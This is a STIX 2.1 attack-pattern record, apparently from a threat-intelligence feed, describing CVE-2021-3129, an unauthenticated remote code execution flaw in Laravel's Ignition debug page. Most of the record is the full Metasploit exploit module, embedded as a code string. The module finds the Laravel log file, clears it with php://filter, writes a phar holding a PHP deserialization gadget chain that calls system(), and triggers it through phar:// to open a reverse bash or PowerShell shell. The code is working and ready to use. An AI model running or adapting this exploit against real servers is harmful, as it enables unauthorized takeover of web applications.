{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d2f90cfd-8279-4798-b378-8757fff5fe27",
    "created": "2024-08-14T17:05:23.048324Z",
    "modified": "2024-08-14T17:05:23.048328Z",
    "name": "Unauthenticated remote code execution in Ignition",
    "description": " Ignition before 2.5.2, as used in Laravel and other products allows unauthenticated remote attackers to execute arbitrary code because of insecure usage of file_get_contents() and file_put_contents(). This is exploitable on sites using debug mode with Laravel before 8.4.2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/php/ignition_laravel_debug_rce.rb",
            "external_id": "ignition_laravel_debug_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-3129"
        },
        {
            "source_name": "reference",
            "url": "https://www.ambionics.io/blog/laravel-debug-rce"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Unauthenticated remote code execution in Ignition',\n        'Description' => %q{\n          Ignition before 2.5.2, as used in Laravel and other products,\n          allows unauthenticated remote attackers to execute arbitrary code\n          because of insecure usage of file_get_contents() and file_put_contents().\n          This is exploitable on sites using debug mode with Laravel before 8.4.2.\n        },\n        'Author' => [\n          'Heyder Andrade <eu[at]heyderandrade.org>', # module development and debugging\n          'ambionics' # discovered\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2021-3129'],\n          ['URL', 'https://www.ambionics.io/blog/laravel-debug-rce']\n        ],\n        'DisclosureDate' => '2021-01-13',\n        'Platform' => %w[unix linux macos win],\n        'Targets' => [\n          [\n            'Unix (In-Memory)',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_memory,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }\n            }\n          ],\n          [\n            'Windows (In-Memory)',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_CMD,\n              'Type' => :win_memory,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/reverse_powershell' }\n            }\n          ]\n        ],\n        'Privileged' => false,\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [true, 'Ignition execute solution path', '/_ignition/execute-solution']),\n      OptString.new('LOGFILE', [false, 'Laravel log file absolute path'])\n    ])\n  end\n\n  def check\n    print_status(\"Checking component version to #{datastore['RHOST']}:#{datastore['RPORT']}\")\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path.to_s),\n      'method' => 'PUT'\n    })\n    # Check whether it is using facade/ignition\n    # If is using it should respond method not allowed\n    # checking if debug mode is enable\n    if res && res.code == 405 && res.body.match(/label:\"(Debug)\"/)\n      vprint_status 'Debug mode is enabled.'\n      # check version\n      versions = JSON.parse(\n        res.body.match(/.+\"report\":(\\{.*),\"exception_class/).captures.first.gsub(/$/, '}')\n      )\n      version = Rex::Version.new(versions['framework_version'])\n      vprint_status \"Found PHP #{versions['language_version']} running Laravel #{version}\"\n      # to be sure that it is vulnerable we could try to cleanup the log files (invalid and valid)\n      # but it is way more intrusive than just checking the version moreover we would need to call\n      # the find_log_file method before, meaning four requests more.\n      return Exploit::CheckCode::Appears if version <= Rex::Version.new('8.26.1')\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    @logfile = datastore['LOGFILE'] || find_log_file\n    fail_with(Failure::BadConfig, 'Log file is required, however it was neither defined nor automatically detected.') unless @logfile\n\n    clear_log\n    put_payload\n    convert_to_phar\n    run_phar\n\n    handler\n\n    clear_log\n  end\n\n  def find_log_file\n    vprint_status 'Trying to detect log file'\n    res = post Rex::Text.rand_text_alpha_upper(12)\n    if res.code == 500 && res.body.match(%r{\"file\":\"(\\\\/[^\"]+?)/vendor\\\\/[^\"]+?})\n      logpath = Regexp.last_match(1).gsub(/\\\\/, '')\n      vprint_status \"Found directory candidate #{logpath}\"\n      logfile = \"#{logpath}/storage/logs/laravel.log\"\n      vprint_status \"Checking if #{logfile} exists\"\n      res = post logfile\n      if res.code == 200\n        vprint_status \"Found log file #{logfile}\"\n        return logfile\n      end\n      vprint_error \"Log file does not exist #{logfile}\"\n      return\n    end\n    vprint_error 'Unable to automatically find the log file. To continue set LOGFILE manually'\n    return\n  end\n\n  def clear_log\n    res = post \"php://filter/read=consumed/resource=#{@logfile}\"\n    # guard clause when trying to exploit a target that is not vulnerable (set ForceExploit true)\n    fail_with(Failure::UnexpectedReply, \"Log file #{@logfile} doesn't seem to exist.\") unless res.code == 200\n  end\n\n  def put_payload\n    post format_payload\n    post Rex::Text.rand_text_alpha_upper(2)\n  end\n\n  def convert_to_phar\n    filters = %w[\n      convert.quoted-printable-decode\n      convert.iconv.utf-16le.utf-8\n      convert.base64-decode\n    ].join('|')\n\n    post \"php://filter/write=#{filters}/resource=#{@logfile}\"\n  end\n\n  def run_phar\n    post \"phar://#{@logfile}/#{Rex::Text.rand_text_alpha_lower(4..6)}.txt\"\n    # resp.body.match(%r{^(.*)\\n<!doctype html>})\n    # $1 ? print_good($1) : nil\n  end\n\n  def body_template(data)\n    {\n      solution: 'Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution',\n      parameters: {\n        viewFile: data,\n        variableName: Rex::Text.rand_text_alpha_lower(4..12)\n      }\n    }.to_json\n  end\n\n  def post(data)\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path.to_s),\n      'method' => 'POST',\n      'data' => body_template(data),\n      'ctype' => 'application/json',\n      'headers' => {\n        'Accept' => '*/*',\n        'Accept-Encoding' => 'gzip, deflate'\n      }\n    })\n  end\n\n  def generate_phar(pop)\n    file = Rex::Text.rand_text_alpha_lower(8)\n    stub = \"<?php __HALT_COMPILER(); ?>\\r\\n\"\n    file_contents = Rex::Text.rand_text_alpha_lower(20)\n    file_crc32 = Zlib.crc32(file_contents) & 0xffffffff\n    manifest_len = 40 + pop.length + file.length\n    phar = stub\n    phar << [manifest_len].pack('V')              # length of manifest in bytes\n    phar << [0x1].pack('V')                       # number of files in the phar\n    phar << [0x11].pack('v')                      # api version of the phar manifest\n    phar << [0x10000].pack('V')                   # global phar bitmapped flags\n    phar << [0x0].pack('V')                       # length of phar alias\n    phar << [pop.length].pack('V')                # length of phar metadata\n    phar << pop                                   # pop chain\n    phar << [file.length].pack('V')               # length of filename in the archive\n    phar << file                                  # filename\n    phar << [file_contents.length].pack('V')      # length of the uncompressed file contents\n    phar << [0x0].pack('V')                       # unix timestamp of file set to Jan 01 1970.\n    phar << [file_contents.length].pack('V')      # length of the compressed file contents\n    phar << [file_crc32].pack('V')                # crc32 checksum of un-compressed file contents\n    phar << [0x1b6].pack('V')                     # bit-mapped file-specific flags\n    phar << [0x0].pack('V')                       # serialized File Meta-data length\n    phar << file_contents                         # serialized File Meta-data\n    phar << [Rex::Text.sha1(phar)].pack('H*')     # signature\n    phar << [0x2].pack('V')                       # signiture type\n    phar << 'GBMB'                                # signature presence\n\n    return phar\n  end\n\n  def format_payload\n    # rubocop:disable  Style/StringLiterals\n    serialize = \"a:2:{i:7;O:31:\\\"GuzzleHttp\\\\Cookie\\\\FileCookieJar\\\"\"\n    serialize << \":1:{S:41:\\\"\\\\00GuzzleHttp\\\\5cCookie\\\\5cFileCookieJar\\\\00filename\\\";\"\n    serialize << \"O:38:\\\"Illuminate\\\\Validation\\\\Rules\\\\RequiredIf\\\"\"\n    serialize << \":1:{S:9:\\\"condition\\\";a:2:{i:0;O:20:\\\"PhpOption\\\\LazyOption\\\"\"\n    serialize << \":2:{S:30:\\\"\\\\00PhpOption\\\\5cLazyOption\\\\00callback\\\";\"\n    serialize << \"S:6:\\\"system\\\";S:31:\\\"\\\\00PhpOption\\\\5cLazyOption\\\\00arguments\\\";\"\n    serialize << \"a:1:{i:0;S:#{payload.encoded.length}:\\\"#{payload.encoded}\\\";}}i:1;S:3:\\\"get\\\";}}}i:7;i:7;}\"\n    # rubocop:enable  Style/StringLiterals\n    phar = generate_phar(serialize)\n\n    b64_gadget = Base64.strict_encode64(phar).gsub('=', '')\n    payload_data = b64_gadget.each_char.collect { |c| c + '=00' }.join\n\n    return Rex::Text.rand_text_alpha_upper(100) + payload_data + '=00'\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2021-01-13",
    "x_mitre_platforms": [
        "win'"
    ]
}